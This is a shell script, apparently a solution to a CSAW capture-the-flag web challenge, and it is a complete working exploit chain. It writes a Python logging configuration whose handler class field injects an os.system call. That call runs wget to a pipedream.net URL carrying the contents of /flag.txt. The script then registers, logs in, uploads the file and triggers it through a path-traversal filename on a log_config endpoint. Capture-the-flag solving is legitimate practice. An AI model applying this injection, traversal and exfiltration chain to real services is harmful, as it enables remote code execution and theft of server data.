#!/bin/sh

cat > payload << 'EOF'
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('wget https://en15nm3l6g3md.x.pipedream.net/?flag=$(cat /flag.txt)')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s%
EOF

register () {
	http \
	--session=./session.json \
	POST \
	http://web.chal.csaw.io:5012/api/register \
	username=crackodile \
	password=crackodile
}

login () {
	http \
	--session=./session.json \
	POST \
	http://web.chal.csaw.io:5012/api/login \
	username=crackodile \
	password=crackodile
}

upload () {
	http \
	--session=./session.json \
	-f \
	POST \
	http://web.chal.csaw.io:5012/api/upload \
	file@"./payload" \
	label=moon
}

gallery () {
	http \
	--session=./session.json \
	GET \
	http://web.chal.csaw.io:5012/api/gallery
}

log_config () {
	http \
	--session=./session.json \
	POST \
	http://web.chal.csaw.io:5012/api/log_config \
	filename=../images/$1
}

register
login
upload
filename=$(gallery | jq '.message[-1]')
log_config $filename
